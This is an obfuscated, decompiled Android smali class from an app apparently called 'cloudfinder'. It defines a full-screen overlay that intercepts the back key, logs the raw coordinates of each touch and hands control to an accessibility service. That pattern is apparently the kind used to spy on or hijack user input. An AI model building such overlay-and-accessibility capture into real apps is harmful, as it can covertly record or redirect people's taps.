.class public final Lڛڜڕڰڑ/أ;
.super Landroid/widget/FrameLayout;
.source "SourceFile"


# instance fields
.field public final synthetic ؋:I

.field public final synthetic ؠ:Ljava/lang/Object;


# direct methods
.method public synthetic constructor <init>(Ljava/lang/Object;Landroid/content/Context;I)V
    .locals 0

    iput p3, p0, Lڛڜڕڰڑ/أ;->؋:I

    iput-object p1, p0, Lڛڜڕڰڑ/أ;->ؠ:Ljava/lang/Object;

    invoke-direct {p0, p2}, Landroid/widget/FrameLayout;-><init>(Landroid/content/Context;)V

    return-void
.end method


# virtual methods
.method public final dispatchKeyEvent(Landroid/view/KeyEvent;)Z
    .locals 4

    iget v0, p0, Lڛڜڕڰڑ/أ;->؋:I

    packed-switch v0, :pswitch_data_0

    invoke-super {p0, p1}, Landroid/view/ViewGroup;->dispatchKeyEvent(Landroid/view/KeyEvent;)Z

    move-result p1

    return p1

    :pswitch_0
    invoke-virtual {p1}, Landroid/view/KeyEvent;->getKeyCode()I

    move-result v0

    const/4 v1, 0x4

    if-ne v0, v1, :cond_0

    invoke-virtual {p1}, Landroid/view/KeyEvent;->getAction()I

    move-result v2

    const/4 v3, 0x1

    if-ne v2, v3, :cond_0

    iget-object p1, p0, Lڛڜڕڰڑ/أ;->ؠ:Ljava/lang/Object;

    check-cast p1, Lڜٟٱڀ/ة;

    iget-boolean p1, p1, Lڜٟٱڀ/ة;->إ:Z

    if-nez p1, :cond_3

    iget-object p1, p0, Lڛڜڕڰڑ/أ;->ؠ:Ljava/lang/Object;

    check-cast p1, Lڜٟٱڀ/ة;

    monitor-enter p1

    :try_start_0
    iput-boolean v3, p1, Lڜٟٱڀ/ة;->ؤ:Z

    iget-object v0, p1, Lڜٟٱڀ/ة;->ت:Landroid/os/Handler;

    new-instance v2, Lڜٟٱڀ/ئ;

    invoke-direct {v2, p1, v1}, Lڜٟٱڀ/ئ;-><init>(Lڜٟٱڀ/ة;I)V

    invoke-virtual {v0, v2}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    monitor-exit p1

    goto :goto_1

    :catchall_0
    move-exception v0

    monitor-exit p1

    throw v0

    :cond_0
    const/4 v1, 0x3

    if-eq v0, v1, :cond_2

    const/16 v1, 0xbb

    if-ne v0, v1, :cond_1

    goto :goto_0

    :cond_1
    invoke-super {p0, p1}, Landroid/view/View;->dispatchKeyEvent(Landroid/view/KeyEvent;)Z

    move-result v3

    goto :goto_1

    :cond_2
    :goto_0
    iget-object p1, p0, Lڛڜڕڰڑ/أ;->ؠ:Ljava/lang/Object;

    check-cast p1, Lڜٟٱڀ/ة;

    iget-boolean v3, p1, Lڜٟٱڀ/ة;->إ:Z

    :cond_3
    :goto_1
    return v3

    :pswitch_data_0
    .packed-switch 0x1
        :pswitch_0
    .end packed-switch
.end method

.method public final onTouchEvent(Landroid/view/MotionEvent;)Z
    .locals 4

    iget v0, p0, Lڛڜڕڰڑ/أ;->؋:I

    packed-switch v0, :pswitch_data_0

    invoke-super {p0, p1}, Landroid/view/View;->onTouchEvent(Landroid/view/MotionEvent;)Z

    move-result p1

    return p1

    :pswitch_0
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "OVERLAY_TOUCH action="

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p1}, Landroid/view/MotionEvent;->getActionMasked()I

    move-result v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v1, " raw=("

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Landroid/view/MotionEvent;->getRawX()F

    move-result v1

    float-to-int v1, v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v1, ","

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Landroid/view/MotionEvent;->getRawY()F

    move-result v1

    float-to-int v1, v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v1, ")"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "MyAccessSvc"

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual {p1}, Landroid/view/MotionEvent;->getActionMasked()I

    move-result v0

    const/4 v1, 0x4

    if-ne v0, v1, :cond_0

    invoke-virtual {p1}, Landroid/view/MotionEvent;->getRawX()F

    invoke-virtual {p1}, Landroid/view/MotionEvent;->getRawY()F

    iget-object v0, p0, Lڛڜڕڰڑ/أ;->ؠ:Ljava/lang/Object;

    check-cast v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    invoke-virtual {p1}, Landroid/view/MotionEvent;->getActionMasked()I

    sget-object v2, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    :cond_0
    invoke-virtual {p1}, Landroid/view/MotionEvent;->getActionMasked()I

    move-result v0

    const/4 v2, 0x1

    if-eq v0, v2, :cond_1

    invoke-virtual {p1}, Landroid/view/MotionEvent;->getActionMasked()I

    move-result v0

    if-ne v0, v1, :cond_3

    :cond_1
    iget-object v0, p0, Lڛڜڕڰڑ/أ;->ؠ:Ljava/lang/Object;

    check-cast v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    sput-object v0, Lڝږ؁ڋ/ؼ;->ة:Landroid/accessibilityservice/AccessibilityService;

    sget-object v1, Lڝږ؁ڋ/ؼ;->ء:Lڝږ؁ڋ/آ;

    if-eqz v1, :cond_2

    sget-object v2, Lڝږ؁ڋ/ؼ;->ؠ:Landroid/os/Handler;

    invoke-virtual {v2, v1}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    :cond_2
    new-instance v1, Lڝږ؁ڋ/آ;

    const/4 v2, 0x6

    invoke-direct {v1, v0, v2}, Lڝږ؁ڋ/آ;-><init>(Landroid/accessibilityservice/AccessibilityService;I)V

    sput-object v1, Lڝږ؁ڋ/ؼ;->ء:Lڝږ؁ڋ/آ;

    sget-object v0, Lڝږ؁ڋ/ؼ;->ؠ:Landroid/os/Handler;

    const-wide/16 v2, 0x14

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    :cond_3
    invoke-super {p0, p1}, Landroid/view/View;->onTouchEvent(Landroid/view/MotionEvent;)Z

    move-result p1

    return p1

    nop

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_0
    .end packed-switch
.end method
